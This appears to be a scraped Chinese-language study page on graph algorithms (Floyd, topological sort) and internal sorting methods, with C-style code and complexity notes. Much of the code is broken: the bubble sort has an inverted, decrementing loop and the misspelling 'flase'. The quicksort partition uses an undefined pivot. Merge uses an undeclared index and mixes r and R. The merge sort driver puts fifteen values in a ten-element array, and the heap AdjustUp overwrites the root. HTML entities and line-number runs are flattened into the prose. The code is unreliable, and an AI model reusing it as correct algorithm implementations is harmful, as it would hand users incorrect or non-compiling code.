算法是基于贪心策略的。若使用邻接矩阵表示，它的**时间复杂度为$O(|V|^2)$。若使用带权的邻接表表示，虽然修改dist[]的时间可以减少，但由于在dist[]中选择最小分量的时间不变，其时间复杂度仍为$O(|V|^2)$。注意：如果边的权值为负，则dijkstra算法不适用。** &#x3D;&#x3D;Floyd算法&#x3D;&#x3D;（动态规划）参考：https://www.bilibili.com/video/BV1LE411R7CS 基本思想 Floyd算法的基本思想是：递推产生一个n阶方阵序列$A^{(-1)}$ ,$A^{(0)}$, … , $A^{(K)}$, … ,$A^{(n-1)}$，其中$A^{(K)}[i][j]$表示从顶点$v_i$到顶点$v_j$的最短路径长度，k表示绕行第k个顶点的运算步骤。 初始时，对于任意两个顶点$v_i$和$v_j$，若它们之间存在边，则以此边上的权值作为它们之间的最短路径长度；若它们之间不存在有向边，则以∞作为它们之间的最短路径长度。逐步尝试在原路径中加入顶点k（k&#x3D;0, 1, …, n-1）作为中间顶点。如果增加中间顶点后，得到的路径比原来的路径长度减少了，则以此新路径代替原路径。算法的描述如下： 定义一个n阶方阵序列：$A^{(-1)}$ ,$A^{(0)}$, … , $A^{(K)}$, … ,$A^{(n-1)}$，其中： $A^{(-1)}[i][j]&#x3D;arcs[i][j]$（也就是不经过任何顶点的路径，路径长度就直接等于邻接矩阵的值） $A^{(k)}[i][j]&#x3D;Min{A^{(k-1)}[i][j], \\space A^{(k-1)}[i][k]+A^{(k-1)}[k][j] }, \\space k&#x3D;0,1,…,n-1$（经过和不经过顶点$v_k$的路径长度，取最小值，得到考虑k个顶点的情况下的最短路径） Floyd 算法是一个迭代的过程，每迭代一次， 在从$v_i$到$v_j$的最短路径上就多考虑了一个顶点；经过n次迭代后所得到的$A^{(n-1)}[i][j]$考虑了路径上可能遇到的所有结点，所以就得到了从$v_i$到$v_j$的最短路径长度，即方阵$A^{(n-1)}$中就保存了任意一对顶点之间的最短路径长度。 算法计算过程举例 如图14-12 所示为带权有向图G及其邻接矩阵，下面通过实例来说明Floyd算法的过程见表14-2。 第一个矩阵$dist^{(-1)}$记录所有顶点之间的初始的路径长度，直连的两顶点的dist值就是其边权值，否则为$\\infty$。 第二个矩阵$dist^{(0)}$将顶点$V_0$纳入路径的考虑中。将已知的顶点$V_i$和顶点$V_j$之间的路径长度$dist^{(-1)}[i][j]$与经过顶点$V_0$的路径长度$dist^{(-1)}[i][0]+dist^{(-1)}[0][j]$相比较，取其最小值作为$dist^{(0)}[i][j]$的值。 比如$dist^{(-1)}[2][1]$初始为$\\infty$，而考虑经过顶点$V_0$时，路径长度为$dist^{(-1)}[2][0]+dist^{(-1)}[0][1]&#x3D;5+6&#x3D;11&lt;\\infty$。因此$dist^{(0)}[2][1]&#x3D;11$。（此处可以有一个path二维数组，用于存储顶点之间的最短路径所经过的顶点，默认值为-1。比如这里可以令$path[2][1]&#x3D;0$表示顶点2到顶点1的最短路径要经过顶点0。查找路径时，再继续查找$path[2][0]$和$path[0][1]$即可，这样就可以查找到完整路径） 同理，第三个矩阵$dist^{(1)}$将顶点$V_1$纳入路径的考虑中。对于顶点$V_i$和顶点$V_j$之间的路径，对比经过$V_1$和不经过$V_1$的情况，取路径长度的最小值得到$dist^{(1)}[i][j]$。 继续循环下去，直到得到矩阵$dist^{(n-1)}$，考虑了所有的n个顶点。 代码 123456789101112131415161718192021222324252627282930313233void Floyd(int n, float MGraph[ ][n]，int Path[][n]) &#123; // n为顶点个数 int i, j，v; int A[n] [n]; // 初始化dist数组和path数组 for(i=0;i&lt;n;++i)&#123; for(j=0;j&lt;n;++j)&#123; A[i][j] = MGraph[i][j]; Path[i][j] = -1; &#125; &#125; // 迭代dist数组 for(v=0;V&lt;n;++v)&#123; // 考虑路径上可能的n个结点 for(i=0;i&lt;n;++i)&#123; // 所有的顶点对vi、vj for(j=0;j&lt;n;++j)&#123; if(A[i][j] &gt; A[i][v]+A[v][j]) &#123; // 经过和不经过顶点v，哪个路径更短 A[i][j] = A[i][v] + A[v][j] ; // 更新dist矩阵 Path[i][j] = v; // 经过顶点v，则将path数组也更新 &#125; &#125; &#125; &#125;&#125;// 根据path数组输出路径void printPath(int u, int V, int path[][max] )&#123; if (path[u][v] == -1 ) cout&lt;&lt;&quot;&lt;&quot;&lt;&lt;u&lt;&lt;&quot;, &quot;&lt;&lt;v&lt;&lt;&quot;&gt;&quot;; //直接输出 else&#123; int mid = path[u] [v] ; printPath(u, mid, path) ; printPath (mid, V, path) ; &#125;&#125; 特点 Floyd算法的时间复杂度为$O(|V|^3)$。不过由于其代码很紧凑，而且并不包含其他复杂的数据结构，因此隐含的常数系数是很小的，即使对于中等规模的输入来说，它仍然是相当有效的。 Floyd算法允许图中有带负权值的边，但不允许有包含带负权值的边组成的回路。Floyd 算法同样也适用于带权无向图，因为带权无向图可以视为有往返二重边的有向图。 也可以用单源最短路径算法来解决每对顶点之间最短路径问题。每一次运行时， 轮流将一个顶点作为源点，并且若所有边权值均为非负时，可以采用上面提到的Dijkstral算法，其时间复杂度为$O(|V|^2)*|V|&#x3D;O(|V|^3)$。 拓扑排序有向无环图：一个有向图中不存在环，则称为有向无环图，简称DAG图。 AOV网：如果用DAG图表示一个工程， 其顶点表示活动，用有向边$&lt;V_i，V_j&gt;$表示活动$V_i$必须先于活动$V_j$进行的这样一种关系， 则将这种有向图称为顶点表示活动的网络，记为AOV网。在AOV网中，活动$V_i$是活动$V_j$的直接前驱，活动$V_j$是活动$V_i$的直接后继，这种前驱和后继关系具有传递性，且任何活动$V_i$不能以它自己作为自己的前驱或后继。 拓扑排序：在图论中，由一个有向无环图的顶点组成的序列，当且仅当满足下列条件时，称为该图的一个拓扑排序。 每个顶点出现且只出现一次。 若项点A在序列中排在顶点B的前面，则在图中不存在从顶点B到顶点A的路径。或者定义为：拓扑排序是对有向无环图的顶点的一种排序，它使得如果存在一条从顶点A到顶点B的路径，那么在排序中顶点B出现在顶点A的后面。每个DAG图都有一个或多个拓扑排序序列。 对一个DAG图进行拓扑排序的算法有很多，下面介绍比较常用的一种方法的步骤： 从DAG图中选择一个没有前驱的顶点并输出。 从图中删除该顶点和所有以它为起点的有向边。 重复1和2直到当前的DAG图为空或当前图中不存在无前驱的顶点为止。而后一种情况，即当前图中不存在无前驱的顶点，则说明有向图中必然存在环。 5 排序参考： https://blog.csdn.net/qq_16775293/article/details/107821256?spm=1001.2014.3001.5502 https://mp.weixin.qq.com/s/ekGdneZrMa23ALxt5mvKpQ https://www.bilibili.com/video/BV1Ur4y1w7tv 算法的稳定性：如果待排序表中有两个元素$R_i$、$R_j$，其对应的关键字$key_i&#x3D;key_j$，且在排序前$R_i$在$R_j$前面，如果使用某排序算法排序后，$R_i$仍然在$R_j$的前面，则称这个排序算法是稳定的，否则称排序算法是不稳定的。 注意：对于不稳定的排序算法，只需举出一组关键字的实例说明它的不稳定性即可。 在排序的过程中，根据数据元素是否完全在内存中，可将排序算法分为两类：内部排序是指在排序期间元素全部存放在内存中的排序；外部排序是指在排序期间元素无法全部同时存放在内存中，必须在排序的过程中根据要求不断地在内、外存之间移动的排序。 123456/* 待排序的顺序表中数据元素的类型声明如下 */typedef int KeyType; // 定义关键字类型typedef struct&#123; KeyType key; // 关键字项 InfType data; // 其他数据项&#125;RecType; 5.1 插入排序基本思想在于每次将一个待排序的记录， 按其关键字大小插入到前面已经排好序的子序列中，直到全部记录插入完成。 直接插入排序 1234567891011121314void InsertSort (RecType R[], int n)&#123; // n为数组长度 int i, j; RecType tmp; for(i=1;i&lt;n;i++) //依次将R[1]~R[n-1]插入到前面已排序序列 if (R[i].key &lt; R[i-1].key) &#123; //若R[i]的关键码小于其前驱，即非递增，需将R[i]插入有序表 tmp=R[i]; //暂存 j=i-1; do&#123; R[j+1] = R[j]; // 向后挪位 j--; //从后往前查找待插入位置 &#125; while (j&gt;=0 &amp;&amp; R[j].key &gt; tmp.key) // 大于tmp时继续往前 R[j+1] = tmp; //复制到插入位置 &#125;&#125; 复杂度 直接插入排序的时间复杂度为$O(n^2)$，空间复杂度为$O(1)$。 在最好情况下，表中元素已经有序，此时每插入一个元素，都只需比较一次而不用移动元素，因而时间复杂度为$O(n)$。 稳定性 由于每次插入元素时总是从后向前先比较再移动，所以不会出现相同元素相对位置发生变化的情况，即直接插入排序是一个稳定的排序方法。 缺点： 1）寻找插入位置（耗时，需要从后往前一个个扫描）； 2）移动元素（需要将插入位置的元素全部后移）； 优化 1）对于寻找插入位置的优化，可以使用二分查找法，由此引出折半插入排序。 折半插入排序：在有序区查找插入位置时，将从后往前的逐个比较优化为折半查找方法，找到插入位置后再集中将后面的元素后移，最后插入。 折半插入排序其实仅减少了元素的比较次数，对移动元素的性能并没有改善。其平均时间复杂度依然为$O(n^2)$，空间复杂度为$O(1)$，是一种稳定的排序方法。 2）携带多个元素进行插入，每次可以移动更多位数，减少移动次数 3）将数组改为链表结构，无需移动元素 4）希尔排序 希尔排序基本思想：先将待排序表分割成若干形如$L[i, i+d, i+2d, ……, i+kd]$的“特殊”子表，分别进行直接插入排序，当整个表中元素已呈“基本有序”时，再对全体记录进行一次直接插入排序。 希尔排序的排序过程如下： 先取一个**小于n的步长$d_1$**，把表中全部记录分成$d_1$个组，所有距离为$d_1$的倍数的记录放在同一个组中，在各组中进行直接插入排序；然后取第二个步长$d_2&lt;d_1$，重复上述过程，直到所取到的$d_t&#x3D;1$，即所有记录已放在同一组中，再进行直接插入排序，由于此时已经具有较好的局部有序性，故可以很快得到最终结果。到目前为止，尚未求得一个最好的增量序列，希尔提出的方法是$d_1&#x3D;n&#x2F;2$，$d_{i+1}&#x3D;\\lfloor d_i&#x2F;2 \\rfloor $，并且最后一个增量等于1。 每一步的步长$d_t$逐渐减小，先让序列大致有序，然后随着$d_t$减小调整分组方式，组序列越来越长，整体序列也逐渐趋向有序。 比如，如下图片中，透明方块一行代表待排序序列，总共15个元素，所以$d_1&#x3D;15&#x2F;2&#x3D;7$，步长为7，序列会被划分为7个组，第二行中同色方块代表同组元素（7种颜色），第三行代表在每组中进行直接插入排序后的序列： 接着，$d_2&#x3D;7&#x2F;2&#x3D;3$，步长为3，所有元素被划分为3个组，图中第二行有三种颜色，第三行代表在每组中进行直接插入排序后的序列： 最后，$d_3&#x3D;3&#x2F;2&#x3D;1$，步长为1，所有元素被划分为1个组，也就是对序列整体进行一次直接插入排序，所以图中第二行只有一种颜色，第三行代表直接插入排序后的序列，这样就得到了最终排序好的序列： 希尔排序的 核心思想 是化远为近，将相隔较远的元素放在一组，组成短序列进行直接插入排序，逐渐使序列整体趋近有序，减少了查找次数和元素移动的次数。 12345678910111213141516171819void ShellSort (RecType R[], int n)&#123; // n为数组长度 int i, j, d; RecType tmp; d = n/2; // 增量置初值 while(d&gt;0)&#123; // 直到增量为0结束，因为最后一个增量必定为1，1/2=0 // 对步长为d的所有分组采用直接插入排序，i首先定位到所有分组的第二个元素，即R[d]、R[d+1]、……，结束后继续往后定位到第三个元素……直到序列末尾 for(i=d;i&lt;n;i++) &#123; // 对R[i]进行直接插入排序 tmp = R[i]; // 暂存要插入的元素 j = i-d; // 前一个元素 while(j&gt;=0 &amp;&amp; tmp.key&lt;R[j].key)&#123; R[j+d] = R[j]; // 组内元素后移 j = j-d; // 继续比较前一个元素 &#125; R[j+d] = tmp; &#125; d = d/2; // 减小增量 &#125;&#125; 复杂度 希尔排序的时间复杂度依赖于增量序列的函数，这涉及数学上尚未解决的难题，难以分析，一般认为其平均时间复杂度为$O(n^{1.3})$，最坏情况下为$O(n^2)$。希尔排序空间复杂度为$O(1)$。 稳定性 当相同关键字的元素被划分到不同的分组时，可能会改变它们之间的相对次序，因此,希尔排序是一一个不稳定的排序方法。 5.2 交换排序冒泡排序 基本思想 假设待排序表长为n，从后往前(或从前往后)两两比较相邻元素的值，若为逆序（即R[i-1]&gt;R[i]），则交换它们，直到序列比较完。我们称它为一趟冒泡，结果将最小的元素交换到待排序列的第一个位置。下一趟冒泡时， 前一趟确定的最小元素不再参与比较，待排序列减少一个元素，每趟冒泡的结果把序列中的最小元素放到了序列的最终位置。这样最多做n-1趟冒泡就能把所有元素排好序。 123456789101112131415161718void BubbleSort(RecType R[], int n)&#123; int i, j; RecType tmp; bool flag = false; // 从前往后比较,将无序区最大值移到末尾 for(i=0; i&lt;n-1; i++)&#123; // 最多比较n-1轮 for(j=0; j&gt;n-i-1; j--)&#123; // 第i轮比较到n-i-1位置为止，后面的部分是有序的 if(R[j].key &gt; R[j+1].key)&#123; tmp = R[j]; R[j] = R[j+1]; R[j+1] = tmp; flag = true; &#125; &#125; if(flag == flase) // 本轮没有发生交换，已经完全有序 return; &#125;&#125; 复杂度 最坏情况下时间复杂度为$O(n^2)$，最好情况下(表中元素基本有序)时间复杂度为$O(n)$，其平均时间复杂度为$O(n^2)$。空间复杂度为$O(1)$。 稳定性 冒泡排序是一个稳定的排序方法。 注意：冒泡排序中所产生的有序子序列一定是全局有序的(不同于直接插入排序)，也就是说有序子序列中的所有元素的关键字一定小于或大于无序子序列中所有元素的关键字，这样每一趟排序都会将一个元素放置到其最终的位置上。 &#x3D;&#x3D;快速排序&#x3D;&#x3D;（常考） 基本思想 基于**分治法。首先从待排序序列中取一个元素作为基准数；然后扫描序列，将比基准数小的元素全部放到它的左边，大于或等于基准数的元素全部放到它的右边，得到左右两个区间**；接着再对左右区间重复第二步，直到各区间少于两个元素。 代码实现中，采用了**挖坑填数**的方法。首先取出基准数的位置（挖坑），从右往左扫描出小于基准数的元素填坑（得到新坑），再从左往右扫描出大于等于基准数的元素填新坑，这样循环下去直到两指针重合，将基准数填入即可。 12345678910111213141516171819202122int paritition(RecType R[], int left, int right) &#123; // 一趟划分 int tmp = R[left]; // 第一个数做为基准数 while (left &lt; right) &#123; // 指针未重合时 while (left &lt; right &amp;&amp; R[right] &gt;= pivot) // 定位到右区间中小于基准数的元素 --right; R[left] = R[right]; // 填坑 while (left &lt; right &amp;&amp; R[left] &lt;= pivot) // 定位到左区间中大于基准数的元素 ++left; R[right] = R[left]; // 填坑 &#125; R[left] = tmp; return left;&#125;void QuickSort(RecType R[], int left, int right) &#123; //快排函数 int tmp; if (left &lt; right) &#123; tmp = paritition(R, left, right); QuickSort(R, left, tmp-1); QuickSort(R, tmp+1, right); &#125;&#125; 时间复杂度 快速排序的运行时间与划分是否对称有关，而后者又与具体使用的划分算法有关。快速排序的最坏情况发生在两个区域分别包含n-1个元素和0个元素时，这种最大程度的不对称性若发生在每一层递归上，即对应于初始排序表基本有序或基本逆序时，就得到最坏情况下的时间复杂度为$O(n^2)$；最好情况下，每次划分都能对称，即基准数就是区间的中值，那么最好情况下时间复杂度为$O(nlog_2n)$。 空间复杂度 由于快速排序是递归的，需要借助一个递归工作栈来保存每一层递归调用的必要信息，其容量应与递归调用的最大深度一致。最好情况下，所取基准数就是区间的中值，每次能划分出长度相等的左右区间，所以递归树高度为$\\lceil log_2n \\rceil$；最坏情况下，因为要进行n-1次递归调用，所以栈的深度为$O(n)$；平均情况下，栈的深度为$O(log_2n)$。因而空间复杂度在最坏情况下为$O(n)$，平均情况下为$O(log_2n)$。 稳定性： 在划分算法中，若右端区间存在两个关键字相同，且均小于基准值的元素，则在交换到左端区间后，它们的相对位置会发生变化，即快速排序是一个不稳定的排序方法。 注意：在快速排序算法中，并不产生有序子序列，但每一趟排序后会将一个元素（基准元素）放到其最终的位置上。 优化 1）当递归过程中划分得到的子序列的规模较小时不要再继续递归调用快速排序，可以采用直接插入排序算法进行后续的排序工作。 2）尽量选取一个可以将数据中分的基准数。如从序列的头尾以及中间选取三个元素，再取这三个元素的中间值作为最终的基准数；或者随机从当前序列中选取基准数，这样做使得最坏情况在实际排序中几乎不会发生。 在最理想的状态下，即partition可能做到最平衡的划分，得到的两个子问题的大小都不可能大于n&#x2F;2，在这种情况下，快速排序的运行速度将大大提升，此时，时间复杂度为$O(nlog_2n)$。 好在快速排序平均情况下运行时间与其最佳情况下的运行时间很接近，而不是接近其最坏情况下的运行时间。快速排序是所有内部排序算法中平均性能最优的排序算法。 快排一次排序的应用 例1：一个数组中存储有且仅有大写和小写字母，编写一个函数对数组内的字母重新排列，让小写字母在所有大写字母之前。(2012. 中兴、2013 ●腾讯) 该题直接使用快排的一次区间划分即可，左右指针索引从两端向中间扫描，挖坑填数。代码略。 例2：给定含有n个元素的整型数组a,其中包括0元素和非0元素，对数组进行排序，要求：(2012.人民搜索) 排序后所有0元素在前，所有非零元素在后，且非零元素排序前后相对位置不变 不能使用额外存储空间 该题需要使用快排的一次空间划分，相当于基准数为0。注意，由于需要保持非零元素排序前后相对位置不变，所以不能使用左右指针索引从两端向中间扫描的办法。这里使用的是将相对位置在左的非0元素依次与在右的0元素交换的方法，这样不会破坏排序前元素的相对位置，代码如下： 1234567891011121314151617void partition(int R[], int p, int r)&#123; int i=r+1; for(int j=r; j &gt;= p; --j) &#123; //从后往前遍历 if(R[j]!=0) &#123; // 遇到非0元素j就后移，即将其与位置--i的元素互换（两种情况：与自身互换；与0元素互换） --i; int temp=R[i]; R[i]=R[j] ; R[j]=temp; &#125; &#125; // return i-1;&#125;void main() &#123; int a[7]=&#123;0, 3, 0，2, 1, 0, 0&#125;; partition(a, 0, 6);&#125; 或者从前往后遍历： 123456789101112void partition(int R[], int p, int r)&#123; int i=p-1; for(int j=p; j &lt;= r-1; ++j) &#123; //从前往后遍历 if(R[j] == 0) &#123; // 遇到0元素j就前移，即将其与位置++i的元素互换（两种情况：与自身互换；与0元素互换） ++i; int temp=R[i]; R[i]=R[j] ; R[j]=temp; &#125; &#125; // return i+1;&#125; 例3：进阶——荷兰国旗问题 将乱序的红白蓝三色小球排列成同颜色在一起的小球组(按照红白蓝排序)，这个问题称为荷兰国旗问题。这是因为我们可以将红白蓝三色小球想象成条状物，有序排列后正好组成荷兰国旗。序列中，0表示红球，1表示白球，2表示蓝球。 这个问题类似于快排的区间划分问题，但是这里需要使用3个指针索引，而不是2个。使用begin指针指向0元素应该在的位置，current用于跳过1元素，end用以指向2元素应该在的位置。begin和current都初始化指向数组首部，end初始化指向数组尾部。代码如下： 12345678910111213141516171819while (current&lt;=end) &#123; int tmp; if (array[current] == 0) &#123; // 0元素前移，current与begin交换 tmp = array[current]; array[current] = array[begin]; array[begin] = tmp; current++; begin++; &#125; else if (array[current] == 1)&#123; // 1元素不动 current++: &#125; else &#123; // 2元素后移，current与end交换 tmp = array[current]; array[current] = array[end]; array[end] = tmp; end--; &#125;&#125; 例4：最小的k个数 输入n个整数，输出其中最小的k个。(2012.网易) 例如输入1, 2, 3，4, 5,，6, 7, 8这8个数字，则最小的4个数字为1, 2, 3, 4。 最简单的思路莫过于把输入的n个整数排序，这样排在最前面的k个数就是最小的k个数。只是这种思路的时间复杂度为O(nlogn)。这里同样可以使用快排区间划分的方法： 我们设最小的k个数中最大的数为A。在快速排序算法中，我们先在数组中随机选择一个数字，然后调整数组中数字的顺序，使得比选中的数字小的数字都排在它的左边，比选中的数字大的数字都排在它的右边( 即快排一次排序)。 如果快排一次划分后这个选中的数字的下标刚好是k-1 (下标从0开始)，那么这个数字(就是A)加上左侧的k-1个数字就是最小的k个数。如果它的下标大于k-I，那么A位于它的左边，我们可以接着在它的左边部分的数组中查找；如果它的下标小于k-1,那么A应该位于它的右边，我们可以接着在它的右边部分的数组中查找。 可见，这是一个递归问题，但是注意我们找到的k个数不一定是有序的。可以用如下代码实现： 123456789101112131415161718192021/* input是输入的数组，元素个数为n, output是用来保存最小k个数的数组*/void getLeastKNum (int* input, int n, int* output, int k) &#123; if(input == NULL || output = NULLI || k &gt; n || k&lt;=0 || n&lt;=0) return; int start = 0; int end = n-1; int index = partition (input, start, end) ; //一次划分函数见前面 while (index != k-1) &#123; if (index &gt; k-1) &#123; // 左区间已包含超过k个数 end=index- 1; index = Partition (input, start , end); &#125; else&#123; start = index+1; index = Partition (input，start, end); &#125; &#125; // 直到index == k-1 为止 for(int i=0;i &lt; k;++i) output[i] = input[i];&#125; 注意上述方法平均时间复杂度为O(n)。 5.3 选择排序简单选择排序从头至尾扫描序列，找出最小的一个元素和第一个元素交换，接着从剩下的元素中继续这种选择和交换方式，最终得到一个有序序列。 123456789101112131415void SelectSort(RecType R[], int n)&#123; int i, j, min_index; RecType tmp; for(i = 0; i&lt;n-1; i++)&#123; min_index = i; for(j=i+1; j&lt;n; j++)&#123; // 定位无序区最小元素 if(R[j].key &lt; R[min_index].key) min_index = j; &#125; if(min_index != i)&#123; // 无序区第一个元素和无序区最小元素交换 tmp = R[i]; R[i] = R[min_index]; R[min_index] = tmp; &#125;&#125; 复杂度： 简单选择排序过程中，元素移动的操作次数很少，不会超过3(n-1)次（一次swap需要3次元素移动），最好的情况是移动0次，此时对应的表已经有序；但元素间比较的次数与序列的初始状态无关，始终是n(n-1)&#x2F;2次，所以时间复杂度始终是$O(n^2)$。空间复杂度：$O(1)$。 稳定性：不稳定。 选择排序中，每一趟选择最小元素前移后，该元素都是处于其最终的位置上。 堆排序Heapsort 是指利用堆这种数据结构所设计的一种排序算法。 堆积具有以下特点： 1）完全二叉树 2）子结点的键值或索引总是小于等于（或者大于等于）它的父节点。 在大根堆中，最大元素存放在根结点中，且对其任一非根结点，它的值小于等于其双亲结点值。小根堆的定义刚好相反，根结点是最小元素。 对于关键字序列$(R_1,R_2,…,R_n)$构建的完全二叉树，结点$R[i]$的左孩子为$R[2i]$，右孩子为$R[2i+1]$。由于一般待排序的数组从0开始编号，所以改为结点$R[i]$的左孩子为$R[2i+1]$，右孩子为$R[2i+2]$。 算法思想： https://www.bilibili.com/video/BV1Ur4y1w7tv?p=20&amp;vd_source=854e3e80724343215a332be36ec7cf83 将初始待排序关键字序列$(R_0,R_1,…,R_{n-1})$构建成大顶堆，此堆为初始的无序区； 将堆顶元素R[0]与最后一个元素$R[n-1]$交换，此时得到新的无序区$(R_0,R_1,…,R_{n-2})$和新的有序区$(R_{n-1})$，且满足$R[1,2,…,n-2]&lt;&#x3D;R[n-1]$； 由于交换后新的堆顶$R[0]$可能违反堆的性质，因此需要对当前无序区调$(R_0,R_1,…,R_{n-2})$调整为新堆，然后再次将$R[0]$与无序区最后一个元素交换，得到新的无序区$(R_0,R_1,…,R_{n-3})$和新的有序区$(R_{n-2}, R_{n-1})$。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。 下面的代码已经调整为从R[0]开始存储元素，所以左右孩子结点分别为2i+1、2i+2。调整堆后根结点为R[0]。 12345678910111213141516171819202122232425262728293031323334353637// 调整根索引为start，最大结点索引不超过end的完全二叉树为大根堆，或者说从中筛选出最大值作为根结点void AdjustDown(RecType R[], int start, int end)&#123; int dad = start, son = 2*dad+1; // R[son]定义为R[dad]的左孩子 RecType tmp; // 如果孩子结点的索引未超出范围，继续向下调整，循环继续 while (son &lt;= end)&#123; // 比较两个孩子的关键字，选择最大的 if(son+1&lt;end &amp;&amp; R[son].key&lt;R[son+1].key) son++; // 若根结点的关键字大于孩子结点，表示调整完成，直接跳出函数 if(R[dad].key &gt; R[son].key) return; // 若根结点的关键字小于孩子结点 else&#123; tmp = R[dad]; R[dad] = R[son]; // 孩子结点和根结点互换 R[son] = tmp; dad = son; // 孩子结点作为下一循环的根结点，继续向下调整 son = 2*dad+1; &#125; &#125;&#125;void HeapSort(RecType R[], int n)&#123; int i; RecType tmp; // 大根堆的初始化：分支结点一共有n/2个，所以调用sift算法n/2次，从下往上（n/2-1到0）将所有以分支节点作为根的子树调整为大根堆 for(i=n/2-1; i&gt;=0; i--)&#123; AdjustDown(R, i, n-1); // 以i作为根结点，向下调整为大根堆 &#125; // 将根结点（最大元素）与最右边叶子结点互换，然后不考虑换下的最大元素，继续调整堆为大根堆，循环n-1次 for(i=n-1; i&gt;0; i--)&#123; tmp = R[0]; // 取出根结点R[0]（目前的最大元素），与叶子结点R[i]互换 R[0] = R[i]; R[i] = tmp; AdjustDown(R, 0, i-1) // 根结点被交换，需要调整新堆为大根堆，且不考虑结点R[i]，R[i]已经有序 &#125;&#125; 大根堆的初始化如下图，对应上述代码中的： 123for(i=n/2-1; i&gt;=0; i--)&#123; AdjustDown(R, i, n-1);&#125; 复杂度 大根堆的调整中，即调用sift函数，向下调整的时间与树高有关，为O(h)，即 $O(log_2n)$。建堆过程中每次向下调整时，大部分结点的高度都较小。因此，可以证明在元素个数为n的序列上**建堆的时间复杂度为 O(n)**，这说明可以在线性时间内，将一个无序数组建成一个大顶堆。 在最好、最坏和平均情况下，堆排序的时间复杂度为$O(nlog_2n)$；空间复杂度为$O(1)$。 稳定性：不稳定。 上述代码中的 AdjustDown函数 是向下调整大根堆，适用于根结点被交换（删除），使堆的性质被破环的情况。比如删除堆顶元素后，应该使用最后一个元素替换堆顶，然后比较堆顶和其左右孩子，交换，然后继续向下调整；而如果是作为叶子结点向堆中插入元素，那么就需要向上调整堆，代码如下： 12345678910void AdjustUp(RecType R[], int k)&#123; // n为所插入的结点索引，也为新堆的结点个数，结点索引从0开始编号 R[0] = R[k]; // 将R[k]暂存到根结点R[0] int i = (k-1)/2; // i始终指向k的父节点 while(i&gt;0 &amp;&amp; R[i].key&lt;R[0].key)&#123; swap(R[k], R[i]); // 父节点下调 k = i; // 更新父节点为k，继续向上比较 i = (k-1)/2; &#125; R[k] = R[0];&#125; 堆排序的应用 &#x3D;&#x3D;最小的k个数&#x3D;&#x3D; 输入n个整数，输出其中最小的k个。例如输入1, 2, 3, 4, 5, 6, 7和8这8个数字，则最小的4个数字为1, 2, 3和4。(2012. 网易) 在讲快排的时候，已经提出了利用快排的一次划分来解此题，时间复杂度为O(n)。但此种方法也有其限制，首先我们需要一次性读入所有数据，其次，需要修改输入的数组。 其实此题也可以利用堆排序来解决，此种方法特别适合于处理海量数据。 首先我们读入k个数创建一个大小为 k 的大根堆，然后我们依次读入剩余数据，如果当前数据比大根堆的堆顶小，则用这个数替换当前堆顶，并调整堆使其保持大根堆的性质；如果当前数据比堆顶大，那么这个数不可能是最小的k个整数之一，故可以抛弃此数。**此种方法总的时间复杂度是O(nlogk)**。 12345678910111213int a[n];// 数组a中存储输入的n个数int R[k+1];//从a中依次读入k个数a[0]到a[k-1]，第一个数存在R[0]中，依此类推// 初始化R为大根堆for(int i=k/2-1; i&gt;=0; i--)&#123; AdjustDown(R, i, k-1); // 以i作为根结点，向下调整为大根堆&#125;for(i=k; i&lt;=n-1; i++) &#123; // 依次读入剩余数据 if(a[i]&gt; R[0]) continue; // 大于堆顶，跳过 else &#123; R[0]=a[i]; // 替换堆顶 AdjustDown(R, 0, k-1); // 调整大根堆 &#125;&#125; 当需要求最大的k个数时，只需将大根堆改为小根堆即可，原理相同。 5.4 归并排序“归并”的含义是将两个或两个以上的有序表组合成一个新的有序表。 二路归并排序参考：https://www.bilibili.com/video/BV1Ur4y1w7tv?p=17 假定待排序表含有n个元素，首先可以视为n个有序的子表，每个子表长度为1，然后两两归并，得到$\\lceil n&#x2F;2 \\rceil$个长度为2或1的有序表；再两两归并，如此重复，直到合并成一个长度为n的有序表为止，这种排序方法称为二路归并排序。如图15-4所示为二路归并排序的例子。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// 将有序的R[left…mid]和R[mid +1 …right]归并到辅助数组rf[left…right]void Merge(ElemType R[], ElemType *rf, int left, int mid, int right)&#123; int j, k; for(i=left, j=mid+1, k=i; i&lt;=mid &amp;&amp; j &lt;=right; ++k)&#123; // i在前一段有序表扫描，j在另一段有序表扫描 // 依次比较，将更小的数存入rf，存入后指针索引后移 if(R[j] &lt; R[i]) rf[k] = r[j++]; else rf[k] = r[i++]; &#125; // 有一个有序表的指针索引到达末尾，将另一有序表的剩余元素全部存入rf即可 // 两个while只会有一个执行 while(i &lt;= mid) rf[k++] = r[i++]; while(j &lt;= right) rf[k++] = r[j++];&#125;/* 递归写法（分治法） */void MergeSort(ElemType R[], ElemType *rf, int left, int right)&#123; if(left&lt;right)&#123; int mid = (left+right)/2; MergeSort(R, rf, left, mid); MergeSort(R, rf, mid+1, right); Merge(R, rf, left, mid, right); &#125;/* 非递归写法 */void MergeSort(ElemType R[], ElemType *rf, int n)&#123; // n为待排序表R的长度 int len = 1; ElemType *q = R; ElemType *tmp; while(len &lt; n) &#123; // 所归并的序列长度 int s = len; len = 2 * s ; // 更新len为原来的2倍，因为是两两合并 int i = 0; while(i+len &lt; n)&#123; // 要合并的两个序列末尾索引不超过n-1 Merge(q, rf, i, i+s-1, i+len-1 ); //对等长的两个子表合并 i = i+len; // 定位i到下一组要合并的序列 &#125; if(i+s &lt; n)&#123; //最后一组不等长的两个子表合并 Merge(q, rf, i, i+s-1, n-1); &#125; // 一轮归并结束，R所有元素转移到rf，所以要交换q,rf，以保证下一趟归并时，仍从q归并到rf tmp = q; q = rf; rf = tmp; &#125;&#125;int main()&#123; int a[10] = &#123;2，3,4，5,15,19,26,27,36,38,44,46,47,48,50&#125;; int b[10]; MergeSort(a, b, 15);&#125; 复杂度： 最坏情况下，合并两个大小为n的已排序数组所需要的比较次数为2n-1，所以每一趟归并的时间复杂度为$O(n)$，共需进行$\\lceil log_2n \\rceil$趟归并，所以算法的时间复杂度为$\\lceil nlog_2n \\rceil$。 Merge()操作中，由于辅助空间刚好要占用n个单元，但每一趟归并后这些空间就被释放了，所以归并排序的空间复杂度为$O(n)$。 稳定性：由于Merge()操作不会改变相同元素的相对次序，所以二路归并排序算法是一个稳定的排序方法。 原地归并排序 多路归并排序外部排序指的是大文件的排序，即待排序的记录存储在外部存储器上，待排序的文件无法一次装入内存，需要在内存和外部存储器之间进行多次数据交换，以达到排序整个文件的目的。 外部排序最常用的算法是多路归并排序，即将原文件分解成多个能够一次性装入内存的部分， 分别把每一部分调入内存完成排序。 然后，对已经排序的子文件进行归并排序。 